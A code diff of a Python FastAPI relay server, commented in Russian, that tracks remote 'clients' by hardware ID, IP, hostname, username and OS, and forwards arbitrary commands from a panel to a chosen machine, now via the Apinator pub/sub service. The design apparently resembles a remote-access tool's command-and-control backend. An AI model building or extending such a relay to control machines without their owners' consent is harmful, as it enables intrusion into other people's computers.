@@ -1,215 +1,127 @@
-# ==================== СЕРВЕРНАЯ ЧАСТЬ ====================
-from fastapi import FastAPI, WebSocket
+import os
+import json
 import asyncio
 import time
-import json
-import os
+from fastapi import FastAPI, WebSocket, HTTPException
+from pydantic import BaseModel
 from contextlib import asynccontextmanager
+import httpx
 
-clients = {}          # hwid -> websocket
-viewers = {}          # viewer_id -> websocket
-client_last_ping = {} # hwid -> timestamp
-client_info = {}      # hwid -> bytes (последнее info-сообщение в JSON)
+# ========== Конфигурация Apinator ==========
+APINATOR_KEY = os.environ.get("APINATOR_KEY")       # публичный ключ (для чтения)
+APINATOR_SECRET = os.environ.get("APINATOR_SECRET") # секретный ключ (для публикации)
+APINATOR_API_URL = "https://api.apinator.com"       # реальный URL из документации
+APINATOR_WS_URL = "wss://ws.apinator.com"           # реальный URL из документации
+
+if not APINATOR_KEY or not APINATOR_SECRET:
+    raise RuntimeError("Apinator credentials not set")
+
+# ========== Состояние сервера ==========
+clients_info = {}  # hwid -> { "ip": ..., "hostname": ..., "username": ..., "os": ... }
 lock = asyncio.Lock()
-dead_viewers = set()  # Отложенное удаление вьюверов
 
+# ========== Модели для API ==========
+class CommandRequest(BaseModel):
+    target: str
+    command: dict
 
-async def cleanup_dead_viewers():
-    """Удаляет мёртвых вьюверов без блокировок"""
-    async with lock:
-        for vid in list(dead_viewers):
-            viewers.pop(vid, None)
-        dead_viewers.clear()
+# ========== Вспомогательные функции ==========
+async def publish_to_apinator(channel: str, message: dict):
+    """Отправляет сообщение в канал Apinator через REST API"""
+    async with httpx.AsyncClient() as client:
+        resp = await client.post(
+            f"{APINATOR_API_URL}/publish",
+            json={
+                "key": APINATOR_KEY,
+                "secret": APINATOR_SECRET,
+                "channel": channel,
+                "message": message
+            },
+            timeout=10.0
+        )
+        if resp.status_code != 200:
+            raise Exception(f"Apinator publish error: {resp.text}")
+        return resp.json()
 
+async def send_to_client(hwid: str, command: dict):
+    """Отправляет команду клиенту через его приватный канал"""
+    channel = f"client_{hwid}"
+    await publish_to_apinator(channel, command)
 
-async def safe_send(ws, data):
-    """Безопасная отправка без повторного захвата lock"""
-    try:
-        await ws.send_bytes(data)
-        return True
-    except:
-        return False
-
-
-async def notify_disconnect(hwid):
-    """Безопасно уведомляет всех подключенных вьюверов об отключении клиента"""
-    msg = json.dumps({"type": "disconnect", "hwid": hwid}).encode()
-    async with lock:
-        viewers_list = list(viewers.values())
-    tasks = [safe_send(v, msg) for v in viewers_list]
-    if tasks:
-        await asyncio.gather(*tasks)
-
-
-async def check_clients():
+# ========== Фоновая задача: подписка на события Apinator ==========
+async def apinator_listener():
+    """Слушает глобальный канал присутствия и обновляет список клиентов"""
+    import websockets
+    uri = f"{APINATOR_WS_URL}?key={APINATOR_KEY}&secret={APINATOR_SECRET}"
     while True:
         try:
-            now = time.time()
-            dead_clients = []
-            async with lock:
-                dead_clients = [hwid for hwid, last in client_last_ping.items() if now - last > 20]
-                for hwid in dead_clients:
-                    ws = clients.pop(hwid, None)
-                    client_last_ping.pop(hwid, None)
-                    client_info.pop(hwid, None)
-                    if ws:
-                        try:
-                            await ws.close()
-                        except:
-                            pass
-            if dead_clients:
-                for hwid in dead_clients:
-                    await notify_disconnect(hwid)
-            await cleanup_dead_viewers()
-        except asyncio.CancelledError:
-            break
-        except:
-            pass
-        await asyncio.sleep(5)
+            async with websockets.connect(uri) as ws:
+                # Подписываемся на канал присутствия (все клиенты)
+                await ws.send(json.dumps({"event": "subscribe", "channel": "presence_global"}))
+                async for message in ws:
+                    data = json.loads(message)
+                    event = data.get("event")
+                    if event == "client_connected":
+                        hwid = data.get("data", {}).get("hwid")
+                        if hwid:
+                            ip = data.get("data", {}).get("ip", "Unknown")
+                            hostname = data.get("data", {}).get("hostname", "Unknown")
+                            username = data.get("data", {}).get("username", "Unknown")
+                            os = data.get("data", {}).get("os", "Unknown")
+                            async with lock:
+                                clients_info[hwid] = {"ip": ip, "hostname": hostname, "username": username, "os": os}
+                    elif event == "client_disconnected":
+                        hwid = data.get("data", {}).get("hwid")
+                        if hwid:
+                            async with lock:
+                                clients_info.pop(hwid, None)
+                    # Можно также обрабатывать обновление информации о клиенте
+        except Exception as e:
+            print(f"Apinator listener error: {e}")
+            await asyncio.sleep(5)
 
-
+# ========== FastAPI приложение ==========
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    # Запуск фоновой задачи проверки пингов
-    task = asyncio.create_task(check_clients())
+    # Запускаем слушатель событий
+    task = asyncio.create_task(apinator_listener())
     yield
     task.cancel()
-    try:
-        await task
-    except asyncio.CancelledError:
-        pass
-
 
 app = FastAPI(lifespan=lifespan)
 
-
+# ========== HTTP эндпоинты ==========
 @app.get("/")
 async def index():
     return {"status": "OK"}
-
 
 @app.get("/health")
 async def health():
     return {"status": "healthy"}
 
+@app.get("/clients")
+async def get_clients():
+    """Возвращает список активных клиентов"""
+    async with lock:
+        return list(clients_info.values())
 
-@app.get("/test")
-async def test():
-    return {"msg": "test ok"}
+@app.post("/command")
+async def send_command(req: CommandRequest):
+    """Принимает команду от панели и отправляет её клиенту через Apinator"""
+    try:
+        await send_to_client(req.target, req.command)
+        return {"status": "ok", "message": "command sent"}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
 
-
+# ========== WebSocket (заглушка, т.к. используем Apinator) ==========
 @app.websocket("/ws")
-async def ws(websocket: WebSocket):
+async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
+    await websocket.send_text("WebSocket on server is deprecated. Use Apinator.")
+    await websocket.close()
 
-    role = websocket.query_params.get("role", "")
-    vid = str(id(websocket))
-
-    if role == "client":
-        hwid = None
-        try:
-            while True:
-                data = await websocket.receive_bytes()
-
-                # Попытка распарсить JSON (для команд)
-                try:
-                    msg = json.loads(data.decode())
-                    if isinstance(msg, dict):
-                        # Обработка ping
-                        if msg.get("type") == "ping":
-                            await websocket.send_bytes(json.dumps({"type": "pong"}).encode())
-                            if hwid:
-                                async with lock:
-                                    client_last_ping[hwid] = time.time()
-                            continue
-
-                        if msg.get("type") == "info":
-                            hwid = msg.get("hwid", "")
-                            if hwid:
-                                async with lock:
-                                    clients[hwid] = websocket
-                                    client_last_ping[hwid] = time.time()
-                                    client_info[hwid] = data
-                                    viewers_list = list(viewers.values())
-
-                                # Рассылаем info всем вьюверам
-                                tasks = [safe_send(v, data) for v in viewers_list]
-                                if tasks:
-                                    await asyncio.gather(*tasks)
-                                continue
-                except:
-                    pass
-
-                # Для всех остальных данных (включая бинарные) - рассылаем всем вьюверам
-                if hwid:
-                    async with lock:
-                        client_last_ping[hwid] = time.time()
-                        viewers_list = list(viewers.values())
-
-                    tasks = [safe_send(v, data) for v in viewers_list]
-                    if tasks:
-                        await asyncio.gather(*tasks)
-        except:
-            pass
-        finally:
-            if hwid:
-                async with lock:
-                    clients.pop(hwid, None)
-                    client_last_ping.pop(hwid, None)
-                    client_info.pop(hwid, None)
-                await notify_disconnect(hwid)
-
-    elif role == "viewer":
-        async with lock:
-            viewers[vid] = websocket
-            info_list = list(client_info.values())
-
-        # Отправляем существующие info новому вьюверу
-        for info_data in info_list:
-            try:
-                await websocket.send_bytes(info_data)
-            except:
-                break
-        try:
-            while True:
-                data = await websocket.receive_bytes()
-                try:
-                    msg = json.loads(data.decode())
-                    if msg.get("type") == "get_clients":
-                        async with lock:
-                            info_list = list(client_info.values())
-                        for info_data in info_list:
-                            try:
-                                await websocket.send_bytes(info_data)
-                            except:
-                                break
-                        continue
-
-                    target_hwid = msg.get("target")
-                    if target_hwid:
-                        target_ws = None
-                        async with lock:
-                            target_ws = clients.get(target_hwid)
-                        if target_ws:
-                            try:
-                                del msg["target"]
-                                await target_ws.send_bytes(json.dumps(msg).encode())
-                            except:
-                                async with lock:
-                                    clients.pop(target_hwid, None)
-                                    client_last_ping.pop(target_hwid, None)
-                                    client_info.pop(target_hwid, None)
-                                await notify_disconnect(target_hwid)
-                except:
-                    pass
-        except:
-            pass
-        finally:
-            async with lock:
-                viewers.pop(vid, None)
-
-
-# Для локального запуска
+# ========== Запуск ==========
 if __name__ == "__main__":
     import uvicorn
     port = int(os.environ.get("PORT", 8000))
